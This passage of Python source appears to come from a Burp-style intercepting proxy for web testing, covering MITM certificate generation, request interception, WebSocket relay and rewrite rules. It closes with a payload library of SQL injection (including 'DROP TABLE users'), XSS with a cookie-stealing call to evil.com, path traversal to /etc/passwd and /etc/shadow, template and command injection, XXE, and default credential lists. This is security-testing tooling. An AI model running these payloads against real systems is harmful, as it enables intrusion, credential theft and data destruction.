                .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False)
                .sign(key, hashes.SHA256(), default_backend()))
        with open(self.ca_crt, 'wb') as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(self.ca_key, 'wb') as f:
            f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                      serialization.NoEncryption()))
        self._ca_cert = cert
        self._ca_key = key
        # Every already-issued per-domain cert was signed by the CA key we
        # just replaced — it can no longer chain to the new CA, so a
        # browser pinning the new CA's SPKI would never match it. Clear
        # both the in-memory cache and the cached files on disk so the
        # next request for any host regenerates against the new CA instead
        # of silently keeping serving a now-orphaned cert.
        self._host_cache.clear()
        for stale in self.cert_dir.glob("*.crt"):
            try:
                stale.unlink()
            except Exception:
                pass
        for stale in self.cert_dir.glob("*.key"):
            try:
                stale.unlink()
            except Exception:
                pass
        return str(self.ca_crt), str(self.ca_key)

    def get_host_cert(self, hostname: str) -> Tuple[str, str]:
        if hostname in self._host_cache:
            return self._host_cache[hostname]
        safe = re.sub(r'[^a-zA-Z0-9._\-]', '_', hostname)
        crt = self.cert_dir / f"{safe}.crt"
        key = self.cert_dir / f"{safe}.key"
        # Check BOTH files — a half-written pair (e.g. crt present, key
        # missing after a manual delete or crash mid-write) must regenerate,
        # not silently hand back a cert with no matching private key.
        # Also check the crt actually holds the full chain (leaf + CA), not
        # just the leaf — certs written before the chain fix was added would
        # otherwise be reused forever as-is (existence alone doesn't catch
        # this), permanently keeping every previously-visited domain on the
        # old cert that could never satisfy the browser's SPKI pin.
        needs_gen = not (crt.exists() and key.exists())
        if not needs_gen:
            try:
                if crt.read_bytes().count(b"-----BEGIN CERTIFICATE-----") < 2:
                    needs_gen = True
            except Exception:
                needs_gen = True
        if needs_gen:
            self._gen_host(hostname, crt, key)
        pair = (str(crt), str(key))
        self._host_cache[hostname] = pair
        return pair

    def _gen_host(self, hostname: str, crt_path: Path, key_path: Path):
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)])
        # Backdate by 1 day — same clock-skew rationale as the root CA above
        now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) \
              - datetime.timedelta(days=1)
        try:
            san = x509.SubjectAlternativeName([x509.IPAddress(ipaddress.ip_address(hostname))])
        except Exception:
            san = x509.SubjectAlternativeName([x509.DNSName(f"*.{hostname}"), x509.DNSName(hostname)])
        cert = (x509.CertificateBuilder()
                .subject_name(name)
                .issuer_name(self._ca_cert.subject)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + datetime.timedelta(days=825))
                .add_extension(san, critical=False)
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                # Required by modern browsers/TLS stacks — without this, some
                # clients reject the leaf cert even though the root CA is trusted.
                .add_extension(
                    x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]),
                    critical=False)
                .add_extension(
                    x509.KeyUsage(digital_signature=True, key_encipherment=True,
                                 content_commitment=False, data_encipherment=False,
                                 key_agreement=False, key_cert_sign=False, crl_sign=False,
                                 encipher_only=False, decipher_only=False),
                    critical=True)
                .sign(self._ca_key, hashes.SHA256(), default_backend()))
        with open(crt_path, 'wb') as f:
            # Full chain, not just the leaf: load_cert_chain() below sends
            # every cert found in this file to the client during the TLS
            # handshake, in order. Chrome's --ignore-certificate-errors-
            # spki-list pin only matches against certs actually presented in
            # that handshake — with just the leaf here (a fresh, per-domain
            # key pair, unrelated to the pinned CA key), the pin could never
            # match anything, so the CA-trust flow silently never worked and
            # every HTTPS site showed the interstitial regardless of which
            # domain was visited.
            f.write(cert.public_bytes(serialization.Encoding.PEM))
            f.write(self._ca_cert.public_bytes(serialization.Encoding.PEM))
        with open(key_path, 'wb') as f:
            f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))

# ========== INTERCEPT MANAGER (REQUEST ONLY) ==========
@dataclass
class PendingItem:
    mid: str
    method: str
    url: str
    headers: dict
    body: Optional[bytes]
    event: threading.Event = field(default_factory=threading.Event)
    modified_headers: Optional[dict] = None
    modified_body: Optional[bytes] = None
    dropped: bool = False
    # True once forward() has been called — distinguishes "not yet forwarded"
    # from "forwarded with an explicitly-empty/None body"
    forwarded: bool = False

class InterceptMgr(QObject):
    req_captured = pyqtSignal(object)

    def __init__(self):
        super().__init__()
        self.enabled = False
        self._lock = threading.Lock()
        self._pending: Dict[str, PendingItem] = {}

    def toggle(self, on: bool):
        self.enabled = on
        if not on:
            self._release_all()

    def _release_all(self):
        with self._lock:
            for pi in list(self._pending.values()):
                if not pi.event.is_set():
                    pi.dropped = False
                    pi.event.set()

    def hold_request(self, mid, url, method, headers, body) -> Optional[PendingItem]:
        pi = PendingItem(mid=mid, method=method, url=url, headers=headers, body=body)
        with self._lock:
            self._pending[mid] = pi
        self.req_captured.emit(pi)
        pi.event.wait(timeout=300)
        with self._lock:
            self._pending.pop(mid, None)
        return None if pi.dropped else pi

    def forward(self, key: str, headers=None, body=None):
        with self._lock:
            pi = self._pending.get(key)
        if pi:
            pi.modified_headers = headers
            pi.modified_body = body
            pi.forwarded = True
            pi.dropped = False
            pi.event.set()

    def drop(self, key: str):
        with self._lock:
            pi = self._pending.get(key)
        if pi:
            pi.dropped = True
            pi.event.set()

    def pending_count(self) -> int:
        with self._lock:
            return sum(1 for p in self._pending.values() if not p.event.is_set())

# ========== PROXY CONNECTION ==========
class ProxyConn(threading.Thread):
    def __init__(self, csock, caddr, proxy):
        super().__init__(daemon=True)
        self.csock = csock
        self.caddr = caddr
        self.proxy = proxy

    def run(self):
        try:
            first = self._readline(self.csock)
            if not first:
                return
            parts = first.split()
            if len(parts) < 2:
                return
            if parts[0].upper() == 'CONNECT':
                self._handle_connect(parts[1])
            else:
                self._handle_plain(first)
        except Exception:
            pass
        finally:
            try:
                self.csock.close()
            except Exception:
                pass

    def _readline(self, s) -> str:
        buf = b''
        while True:
            try:
                ch = s.recv(1)
            except Exception:
                break
            if not ch:
                break
            if ch == b'\n':
                break
            buf += ch
        return buf.decode('utf-8', 'replace').rstrip('\r\n')

    def _read_headers(self, s) -> dict:
        h = {}
        while True:
            line = self._readline(s)
            if not line:
                break
            if ':' in line:
                k, v = line.split(':', 1)
                h[k.strip()] = v.strip()
        return h

    def _read_body(self, s, headers: dict) -> bytes:
        # Handle chunked transfer encoding
        te = headers.get('Transfer-Encoding', headers.get('transfer-encoding', '')).lower()
        if 'chunked' in te:
            return self._read_chunked(s)
        cl = int(headers.get('Content-Length', headers.get('content-length', 0)))
        if cl <= 0:
            return b''
        chunks = []
        rem = cl
        while rem > 0:
            try:
                d = s.recv(min(rem, 16384))
                if not d:
                    break
                chunks.append(d)
                rem -= len(d)
            except Exception:
                break
        return b''.join(chunks)

    def _read_chunked(self, s) -> bytes:
        """Read a chunked HTTP body."""
        body = b''
        try:
            while True:
                size_line = self._readline(s).strip()
                if not size_line:
                    size_line = self._readline(s).strip()
                chunk_size = int(size_line.split(';')[0], 16)
                if chunk_size == 0:
                    self._readline(s)
                    break
                data = b''
                while len(data) < chunk_size:
                    d = s.recv(min(chunk_size - len(data), 16384))
                    if not d:
                        break
                    data += d
                body += data
                self._readline(s)
        except Exception:
            pass
        return body

    def _handle_connect(self, target: str):
        host, port = target.rsplit(':', 1) if ':' in target else (target, '443')
        port = int(port)
        # consume CONNECT headers
        while self._readline(self.csock):
            pass
        self.csock.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")

        if not self.proxy.certs.has_ca():
            self._tunnel(host, port)
            return

        try:
            crt, key_f = self.proxy.certs.get_host_cert(host)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(crt, key_f)
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            # ── CRITICAL: advertise only HTTP/1.1 via ALPN ──────────────────
            # Without this, Chrome/Firefox negotiate h2 (HTTP/2) inside the
            # tunnel, the proxy gets binary frames, parse fails, body = nothing.
            try:
                ctx.set_alpn_protocols(['http/1.1'])
            except AttributeError:
                pass  # older Python builds — still works, browser falls back
            client_tls = ctx.wrap_socket(self.csock, server_side=True)
        except ssl.SSLError as e:
            # Previously silent: the browser just saw the socket die with
            # zero bytes back (Chrome shows this as ERR_CONNECTION_CLOSED)
            # and there was no trace of why anywhere in the tool.
            self.proxy.err.emit(f"MITM handshake with browser failed for {host}: {e}")
            try: self.csock.close()
            except Exception: pass
            return
        except Exception as e:
            self.proxy.err.emit(f"Cert generation failed for {host}: {e} — falling back to plain tunnel")
            self._tunnel(host, port)
            return

        try:
            self._http_stream(client_tls, host, port, 'https')
        finally:
            try:
                client_tls.close()
            except Exception:
                pass

    def _tunnel(self, host: str, port: int):
        try:
            rsock = socket.create_connection((host, port), timeout=15)
            def relay(src, dst):
                try:
                    while True:
                        d = src.recv(8192)
                        if not d:
                            break
                        dst.sendall(d)
                except Exception:
                    pass
                try:
                    dst.close()
                except Exception:
                    pass
            threading.Thread(target=relay, args=(rsock, self.csock), daemon=True).start()
            relay(self.csock, rsock)
        except Exception as e:
            self.proxy.err.emit(f"Tunnel to {host}:{port} failed: {e}")

    def _handle_plain(self, first: str):
        parts = first.split()
        method = parts[0].upper()
        url = parts[1]
        headers = self._read_headers(self.csock)
        # RFC 7231 §5.1.1 — respond 100 Continue so body bytes are released
        if headers.get('Expect', headers.get('expect', '')).lower() == '100-continue':
            try:
                self.csock.sendall(b"HTTP/1.1 100 Continue\r\n\r\n")
            except Exception:
                pass
        body = self._read_body(self.csock, headers)
        parsed = urlparse(url)
        host = parsed.hostname or headers.get('Host', '').split(':')[0]
        port = parsed.port or 80
        path = (parsed.path or '/') + (('?' + parsed.query) if parsed.query else '')
        self._forward(self.csock, method, path, url, headers, body, host, port, 'http')

    def _http_stream(self, sock, host: str, port: int, scheme: str):
        while True:
            try:
                first = self._readline(sock)
                if not first:
                    break
                parts = first.split()
                if len(parts) < 2:
                    break
                method = parts[0].upper()
                path = parts[1]
                headers = self._read_headers(sock)
                # RFC 7231 §5.1.1 — send 100 Continue so the browser releases the body
                if headers.get('Expect', headers.get('expect', '')).lower() == '100-continue':
                    try:
                        sock.sendall(b"HTTP/1.1 100 Continue\r\n\r\n")
                    except Exception:
                        pass
                body = self._read_body(sock, headers)
                url = f"{scheme}://{host}{path}"
                ok = self._forward(sock, method, path, url, headers, body, host, port, scheme)
                if not ok:
                    break
                conn_parts = [p.strip().lower() for p in
                             headers.get('Connection', headers.get('connection', '')).split(',')]
                if 'close' in conn_parts:
                    break
            except Exception:
                break

    def _forward(self, client_sock, method, path, url, headers, body, host, port, scheme) -> bool:
        mid = str(uuid.uuid4())
        start = time.time()
        proxy = self.proxy

        # Apply match/replace rules
        headers, body = proxy.apply_rules(url, headers, body, 'request')

        # ── Request intercept (with optional URL filter) ──────────────────
        if proxy.intercept.enabled:
            flt = getattr(proxy, '_intercept_url_filter', '')
            should_hold = True
            if flt:
                try:
                    should_hold = bool(re.search(flt, url, re.I))
                except re.error:
                    should_hold = flt in url
            if should_hold:
                pi = proxy.intercept.hold_request(mid, url, method, headers, body)
                if pi is None:
                    self._send_err(client_sock, 403, "Dropped by Kingception")
                    return False
                if pi.modified_headers is not None:
                    headers = pi.modified_headers
                if pi.forwarded:
                    body = pi.modified_body   # None = no body; bytes = modified body

        # ── Open connection to remote server ──────────────────────────────
        try:
            rsock = socket.create_connection((host, port), timeout=20)
            if scheme == 'https':
                # Force HTTP/1.1 on the remote side too so we can parse responses
                rctx = ssl.create_default_context()
                rctx.check_hostname = False
                rctx.verify_mode = ssl.CERT_NONE
                try:
                    rctx.set_alpn_protocols(['http/1.1'])
                except AttributeError:
                    pass
                rsock = rctx.wrap_socket(rsock, server_hostname=host)
        except Exception as e:
            self.proxy.err.emit(f"Connect to {host}:{port} failed: {e}")
            self._send_err(client_sock, 502, f"Connect failed: {e}")
            return False

        # ── WebSocket upgrade: dedicated handshake + raw relay path ─────────
        # MUST be checked before the normal request-building code below,
        # which strips Upgrade/Connection and forces Connection: close —
        # exactly the two headers a WS handshake requires to succeed.
        conn_hdr = headers.get('Connection', headers.get('connection', '')).lower()
        upg_hdr  = headers.get('Upgrade', headers.get('upgrade', '')).lower()
        is_ws_upgrade = upg_hdr == 'websocket' and 'upgrade' in [
            p.strip() for p in conn_hdr.split(',')]
        if is_ws_upgrade:
            return self._handle_ws_upgrade(
                client_sock, rsock, mid, method, path, url, headers, body,
                host, port, scheme, start)

        try:
            # ── Build and send the request ────────────────────────────────
            # Always strip hop-by-hop / encoding headers; recalculate Content-Length
            skip_req = {'proxy-connection', 'proxy-authorization', 'proxy-authenticate',
                        'content-length', 'transfer-encoding', 'te', 'trailers',
                        'upgrade', 'connection', 'expect'}
            req_lines = [f"{method} {path} HTTP/1.1"]
            has_host = False
            for k, v in headers.items():
                if k.lower() in skip_req:
                    continue
                if k.lower() == 'host':
                    has_host = True
                req_lines.append(f"{k}: {v}")
            if not has_host:
                req_lines.append(f"Host: {host}")
            req_lines.append("Connection: close")   # force non-persistent — prevents keep-alive hangs
            if body:
                req_lines.append(f"Content-Length: {len(body)}")
            req_lines.append("")
            req_lines.append("")
            raw_req = "\r\n".join(req_lines).encode('utf-8', 'replace')
            rsock.sendall(raw_req)
            if body:
                rsock.sendall(body)

            # ── Read raw response from server ─────────────────────────────
            header_bytes, resp_body_raw = self._recv_response(rsock)
            if header_bytes is None and not resp_body_raw:
                self._send_err(client_sock, 502, "Empty response from server")
                return False

            # ── Parse response status line + headers ──────────────────────
            if header_bytes is None:
                # No header/body separator ever arrived — treat whole thing as body
                status, reason, resp_headers, resp_body = 200, "OK", {}, resp_body_raw
            else:
                header_section = header_bytes.decode('utf-8', 'replace')
                lines = header_section.split('\n')
                status_line = lines[0].strip()
                parts = status_line.split(' ', 2)
                try:
                    status = int(parts[1])
                except Exception:
                    status = 200
                reason = parts[2].strip() if len(parts) > 2 else ""

                resp_headers: dict = {}
                for l in lines[1:]:
                    l = l.strip()
                    if ':' in l:
                        k2, v2 = l.split(':', 1)
                        resp_headers[k2.strip()] = v2.strip()

                # _recv_response() already de-framed the body per
                # Content-Length/Transfer-Encoding; only content-encoding
                # (gzip/br/deflate) decompression remains to do here.
                ce = resp_headers.get('Content-Encoding', resp_headers.get('content-encoding', ''))
                resp_body = decompress(resp_body_raw, ce)

            dur = time.time() - start

            # Apply match/replace on response
            _, resp_body = proxy.apply_rules(url, resp_headers, resp_body, 'response')

            # Store in DB
            msg = dict(
                id=mid, url=url, method=method, host=host, port=port,
                path=path, scheme=scheme, req_headers=headers, req_body=body,
                resp_headers=resp_headers, resp_body=resp_body, status=status,
                ts=start, dur=dur, resp_size=len(resp_body),
                content_type=resp_headers.get('Content-Type',
                             resp_headers.get('content-type', '')),
                source_ip=str(self.caddr[0]) if self.caddr else ''
            )
            proxy.process_message(msg)

            # ── Send response back to browser ─────────────────────────────
            skip_resp = {'transfer-encoding', 'content-encoding', 'content-length',
                         'connection', 'keep-alive'}
            out = [f"HTTP/1.1 {status} {reason}"]
            for k, v in resp_headers.items():
                if k.lower() not in skip_resp:
                    out.append(f"{k}: {v}")
            out.append(f"Content-Length: {len(resp_body)}")
            out.append("Connection: close")
            out.append("")
            out.append("")
            client_sock.sendall("\r\n".join(out).encode('utf-8', 'replace'))
            client_sock.sendall(resp_body)
            return True

        except Exception as e:
            self.proxy.err.emit(f"Forward to {host}{path} failed: {e}")
            try:
                self._send_err(client_sock, 502, str(e))
            except Exception:
                pass
            return False
        finally:
            try:
                rsock.close()
            except Exception:
                pass

    def _handle_ws_upgrade(self, client_sock, rsock, mid, method, path, url,
                           headers, body, host, port, scheme, start) -> bool:
        """Dedicated WebSocket handshake path. Sends the upgrade request to
        the origin WITHOUT stripping Upgrade/Connection and WITHOUT forcing
        Connection: close (both of which the normal _forward() path does,
        which is exactly why WS upgrades were silently failing). On a 101
        response, relays raw bytes bidirectionally for the life of the
        session — same pattern as _tunnel() — instead of trying to read a
        bounded HTTP response that will never arrive."""
        proxy = self.proxy
        try:
            # Preserve every header exactly as the client sent it — the
            # Sec-WebSocket-Key/Version/Protocol values must round-trip
            # untouched for the origin to compute a valid Sec-WebSocket-Accept.
            req_lines = [f"{method} {path} HTTP/1.1"]
            has_host = False
            for k, v in headers.items():
                if k.lower() in ('proxy-connection', 'proxy-authorization', 'proxy-authenticate'):
                    continue
                if k.lower() == 'host':
                    has_host = True
                req_lines.append(f"{k}: {v}")
            if not has_host:
                req_lines.append(f"Host: {host}")
            req_lines.append("")
            req_lines.append("")
            rsock.sendall("\r\n".join(req_lines).encode('utf-8', 'replace'))
            if body:
                rsock.sendall(body)

            # Read ONLY the status line + headers — a 101 response has no
            # body, and _recv_all() would block for its full timeout waiting
            # for a socket close that a live WS session will never produce.
            status_line = self._readline(rsock)
            parts = status_line.split(' ', 2)
            try:
                status = int(parts[1])
            except Exception:
                status = 0
            reason = parts[2].strip() if len(parts) > 2 else ""
            resp_headers = self._read_headers(rsock)

            if status != 101:
                # Origin declined the upgrade (auth required, wrong path,
                # etc). Read whatever normal body it sent and complete this
                # as an ordinary HTTP response — no relay needed.
                resp_body = self._read_body(rsock, resp_headers)
                dur = time.time() - start
                msg = dict(
                    id=mid, url=url, method=method, host=host, port=port,
                    path=path, scheme=scheme, req_headers=headers, req_body=body,
                    resp_headers=resp_headers, resp_body=resp_body, status=status,
                    ts=start, dur=dur, resp_size=len(resp_body),
                    content_type=resp_headers.get('Content-Type',
                                 resp_headers.get('content-type', '')),
                    source_ip=str(self.caddr[0]) if self.caddr else ''
                )
                proxy.process_message(msg)
                out = [f"HTTP/1.1 {status} {reason}"]
                for k, v in resp_headers.items():
                    if k.lower() not in ('transfer-encoding', 'content-length', 'connection'):
                        out.append(f"{k}: {v}")
                out.append(f"Content-Length: {len(resp_body)}")
                out.append("Connection: close")
                out.append(""); out.append("")
                client_sock.sendall("\r\n".join(out).encode('utf-8', 'replace'))
                client_sock.sendall(resp_body)
                return False

            # ── 101 Switching Protocols — relay the handshake to the client,
            # log it, then hand off to a raw bidirectional byte pump ────────
            dur = time.time() - start
            msg = dict(
                id=mid, url=url, method=method, host=host, port=port,
                path=path, scheme=scheme, req_headers=headers, req_body=body,
                resp_headers=resp_headers, resp_body=b'', status=101,
                ts=start, dur=dur, resp_size=0, content_type='websocket',
                source_ip=str(self.caddr[0]) if self.caddr else ''
            )
            proxy.process_message(msg)

            out = [f"HTTP/1.1 101 {reason or 'Switching Protocols'}"]
            for k, v in resp_headers.items():
                out.append(f"{k}: {v}")
            out.append(""); out.append("")
            client_sock.sendall("\r\n".join(out).encode('utf-8', 'replace'))

            def relay(src, dst):
                try:
                    while True:
                        d = src.recv(65536)
                        if not d:
                            break
                        dst.sendall(d)
                except Exception:
                    pass
                try:
                    dst.close()
                except Exception:
                    pass

            t = threading.Thread(target=relay, args=(rsock, client_sock), daemon=True)
            t.start()
            relay(client_sock, rsock)   # blocks until this side closes too
            return False

        except Exception as e:
            try:
                self._send_err(client_sock, 502, f"WS upgrade failed: {e}")
            except Exception:
                pass
            return False
        finally:
            try:
                rsock.close()
            except Exception:
                pass

    def _recv_all(self, sock) -> bytes:
        """Read entire server response with a generous timeout."""
        chunks = []
        sock.settimeout(20)
        try:
            while True:
                d = sock.recv(65536)
                if not d:
                    break
                chunks.append(d)
        except socket.timeout:
            pass
        except Exception:
            pass
        return b''.join(chunks)

    def _recv_response(self, sock):
        """Read exactly one HTTP response using Content-Length / chunked
        framing instead of waiting for the connection to close.

        The old approach (_recv_all) read until EOF or a 20s timeout,
        which works but is fragile: any origin that ignores our
        'Connection: close' request (common behind load balancers/CDNs
        that manage their own keep-alive pooling) stalls every single
        request for the full 20s instead of returning the moment the
        declared body length is satisfied. Falls back to read-until-close
        only when neither Content-Length nor Transfer-Encoding is present,
        which is the only HTTP-compliant signal left in that case.

        Returns (header_bytes, body_bytes). header_bytes is None if a
        full header block never arrived — caller should treat body_bytes
        as the raw (possibly headerless/malformed) response in that case.
        """
        sock.settimeout(20)
        buf = b''
        while b'\r\n\r\n' not in buf and b'\n\n' not in buf:
            try:
                d = sock.recv(65536)
            except Exception:
                d = b''
            if not d:
                return None, buf
            buf += d
            if len(buf) > 4_000_000:   # runaway header guard
                return None, buf

        sep = buf.find(b'\r\n\r\n'); sep_len = 4
        if sep == -1:
            sep = buf.find(b'\n\n'); sep_len = 2

        header_bytes = buf[:sep]
        body_so_far = buf[sep + sep_len:]

        te = ''
        cl = None
        for line in header_bytes.decode('utf-8', 'replace').split('\n')[1:]:
            line = line.strip()
            if ':' not in line:
                continue
            k, v = line.split(':', 1)
            k = k.strip().lower()
            if k == 'transfer-encoding':
                te = v.strip().lower()
            elif k == 'content-length':
                cl = v.strip()

        if 'chunked' in te:
            return header_bytes, self._recv_chunked_stream(sock, body_so_far)

        if cl is not None and cl.isdigit():
            need = int(cl)
            while len(body_so_far) < need:
                try:
                    d = sock.recv(65536)
                except Exception:
                    break
                if not d:
                    break
                body_so_far += d
            return header_bytes, body_so_far[:need]

        # Neither chunked nor Content-Length — the only HTTP-compliant
        # signal left is connection close, so (and only so) fall back.
        chunks = [body_so_far]
        try:
            while True:
                d = sock.recv(65536)
                if not d:
                    break
                chunks.append(d)
        except Exception:
            pass
        return header_bytes, b''.join(chunks)

    def _recv_chunked_stream(self, sock, initial: bytes) -> bytes:
        """Read a chunked-transfer-encoded body, given any bytes already
        buffered past the header terminator, pulling more from sock as
        needed instead of requiring the whole thing to already be in hand."""
        buf = initial
        out = b''
        while True:
            nl = buf.find(b'\r\n')
            while nl == -1:
                try:
                    d = sock.recv(65536)
                except Exception:
                    return out
                if not d:
                    return out
                buf += d
                nl = buf.find(b'\r\n')
            size_line = buf[:nl].split(b';')[0].strip()
            try:
                size = int(size_line, 16)
            except Exception:
                return out
            buf = buf[nl + 2:]
            if size == 0:
                return out
            while len(buf) < size + 2:
                try:
                    d = sock.recv(65536)
                except Exception:
                    return out + buf[:size]
                if not d:
                    return out + buf[:size]
                buf += d
            out += buf[:size]
            buf = buf[size + 2:]

    def _decode_chunked(self, data: bytes) -> bytes:
        """Decode chunked transfer-encoded body."""
        out = b''
        while data:
            nl = data.find(b'\r\n')
            if nl == -1:
                nl = data.find(b'\n')
            if nl == -1:
                break
            size_str = data[:nl].split(b';')[0].strip()
            try:
                size = int(size_str, 16)
            except Exception:
                break
            if size == 0:
                break
            start2 = nl + (2 if data[nl:nl+2] == b'\r\n' else 1)
            out += data[start2:start2 + size]
            data = data[start2 + size:]
            if data[:2] == b'\r\n':
                data = data[2:]
            elif data[:1] == b'\n':
                data = data[1:]
        return out

    def _send_err(self, s, code: int, msg: str):
        body = msg.encode('utf-8', 'replace')
        try:
            s.sendall(f"HTTP/1.1 {code} Error\r\nContent-Type: text/plain\r\n"
                      f"Content-Length: {len(body)}\r\n\r\n".encode() + body)
        except Exception:
            pass

# ========== PROXY SERVER ==========
class ProxyServer(QObject):
    msg_received = pyqtSignal(dict)
    started = pyqtSignal(int)
    stopped = pyqtSignal()
    err = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.db = DB()
        self.certs = CertManager()
        self.intercept = InterceptMgr()
        self.rules = self.db.load_rules()
        self.responders = self.db.load_responders()
        self.scope = []
        self.is_running = False
        self._srv = None
        self.req_count = 0
        self.bytes_in = 0
        self.bytes_out = 0
        self._rate_hist = deque(maxlen=120)

    def rps(self) -> float:
        now = time.time()
        return sum(1 for t in self._rate_hist if now - t < 10) / 10.0

    def start(self, host='127.0.0.1', port=8080):
        if self.is_running:
            return
        try:
            self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._srv.bind((host, port))
            self._srv.listen(256)
            self._srv.settimeout(1.0)
            self.is_running = True
            threading.Thread(target=self._accept, daemon=True).start()
            self.started.emit(port)
        except Exception as e:
            self.err.emit(str(e))

    def stop(self):
        self.is_running = False
        if self._srv:
            try:
                self._srv.close()
            except Exception:
                pass
        self.intercept.toggle(False)
        self.stopped.emit()

    def _accept(self):
        while self.is_running:
            try:
                cs, ca = self._srv.accept()
                ProxyConn(cs, ca, self).start()
            except socket.timeout:
                continue
            except Exception:
                break

    def process_message(self, msg: dict):
        if not self._in_scope(msg['url']):
            return
        self.db.save_msg(msg)
        self.req_count += 1
        self.bytes_out += len(msg.get('req_body') or b'')
        self.bytes_in += msg.get('resp_size', 0)
        self._rate_hist.append(time.time())
        self.msg_received.emit(msg)

    def _in_scope(self, url: str) -> bool:
        if not self.scope:
            return True
        for r in self.scope:
            if not r.enabled:
                continue
            matched = r.pattern in url or bool(re.search(r.pattern, url, re.I))
            if r.rule_type == 'include' and matched:
                return True
            if r.rule_type == 'exclude' and matched:
                return False
        return any(r.rule_type == 'include' for r in self.scope if r.enabled)

    def apply_rules(self, url, headers, body, direction):
        for r in self.rules:
            if not r.enabled or r.apply_to not in (direction, 'both'):
                continue
            if r.scope in ('body', 'both') and body:
                try:
                    s = decode_body(body)
                    if r.is_regex:
                        s = re.sub(r.pattern, r.replace, s)
                    else:
                        s = s.replace(r.pattern, r.replace)
                    body = s.encode('utf-8', 'replace')
                except Exception:
                    pass
            if r.scope in ('headers', 'both') and headers:
                nh = {}
                for k, v in headers.items():
                    try:
                        if r.is_regex:
                            v = re.sub(r.pattern, r.replace, v)
                        else:
                            v = v.replace(r.pattern, r.replace)
                    except Exception:
                        pass
                    nh[k] = v
                headers = nh
        return headers, body

# ========== PAYLOADS ==========
class Payloads:
    SQLI = ["'", "' OR '1'='1", "' OR '1'='1'--", "1; DROP TABLE users--",
            "' AND SLEEP(3)--", "' UNION SELECT NULL,username,password FROM users--",
            "1' AND 1=1--", "1' AND 1=2--", "admin'--", "' OR 1=1--",
            "\" OR 1=1--", "' OR 'x'='x", "' AND '1'='2", "1 OR 1=1",
            "') OR ('1'='1", "1;SELECT SLEEP(5)#", "1 AND SLEEP(5)",
            "1' AND SLEEP(3)-- -", "'; WAITFOR DELAY '0:0:3'--"]
    XSS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
           "<svg onload=alert(1)>", "javascript:alert(1)",
           "'\"><script>alert(1)</script>", "<iframe src=javascript:alert(1)>",
           "'-alert(1)-'", "<body onload=alert(1)>",
           "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>",
           "<script>fetch('//evil.com?c='+document.cookie)</script>"]
    LFI = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
           "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
           "..%252f..%252fetc%252fpasswd",
           "php://filter/read=convert.base64-encode/resource=index.php",
           "/proc/self/environ", "C:\\windows\\win.ini", "..\\..\\windows\\win.ini",
           "file:///etc/passwd", "../../../../etc/shadow"]
    SSTI = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
            "{{config}}", "{{self.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.mro()[2].__subclasses__()}}", "${T(java.lang.Runtime).getRuntime().exec('id')}"]
    CMDI = ["; ls", "& whoami", "| id", "|| id", "&& id", "; cat /etc/passwd",
            "`whoami`", "$(whoami)", "; sleep 5", "| sleep 5", "& ping -c 3 127.0.0.1 &"]
    FUZZ = ["", " ", "null", "undefined", "NaN", "Infinity", "-1", "0", "99999999",
            "true", "false", "[]", "{}", "A"*100, "A"*1000, "\x00", "%00",
            "<", ">", "\"", "'", "\\", "/", ".", "\n", "\r\n", "../", "..%2f"]
    NOSQL = ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}', '{"$where":"this.password.length>0"}']
    REDIR = ["//evil.com", "https://evil.com", "\\\\evil.com", "/\\evil.com", "///evil.com", "https://evil.com%40trusted.com"]
    XXEFUZZ = ['<?xml version="1.0"?><!DOCTYPE x[<!ENTITY y SYSTEM "file:///etc/passwd">]><x>&y;</x>']
    COMMON_PASSWORDS = ["123456", "password", "admin", "letmein", "qwerty", "abc123", "monkey", "1234567890",
                        "password1", "iloveyou", "admin123", "test", "pass", "root", "toor", "secret",
                        "P@ssw0rd", "P@$$w0rd", "Welcome1", "Summer2024!", "Winter2024!", "Spring2024!",
                        "Passw0rd!", "changeme", "qwerty123", "111111", "dragon", "master", "sunshine"]
    COMMON_USERS = ["admin", "administrator", "root", "user", "test", "guest", "operator",
                    "manager", "support", "info", "webmaster", "dev", "api"]

    @classmethod
    def categories(cls) -> Dict[str, List[str]]:
        return {
            "SQL Injection": cls.SQLI, "XSS": cls.XSS,
            "LFI / Path Traversal": cls.LFI, "SSTI": cls.SSTI,
            "Command Injection": cls.CMDI, "Fuzzing": cls.FUZZ,
            "NoSQL Injection": cls.NOSQL, "Open Redirect": cls.REDIR,
            "XXE": cls.XXEFUZZ,
            "Common Passwords": cls.COMMON_PASSWORDS,
            "Common Usernames": cls.COMMON_USERS,
        }

# ========== INTRUDER PAYLOAD TYPES (Burp-style generators) ==========
INTRUDER_PAYLOAD_TYPES = [
    "Simple list", "Runtime file", "Custom iterator", "Character substitution",
    "Case modification", "Recursive grep", "Illegal Unicode", "Character blocks",
    "Numbers", "Dates", "Brute forcer", "Null payloads", "Character frobber",
    "Bit flipper", "Username generator", "ECB block shuffler",
    "Extension-generated", "Copy other payload",
]

# Payload types that need no extra configuration panel / generate step —
# they behave exactly like the classic manual list.
INTRUDER_SIMPLE_TYPES = {"Simple list"}


class PayloadGenerators:
    """Pure functions that turn a small config dict into a concrete list of
    payload strings for each Burp-style Intruder payload type."""

    @staticmethod
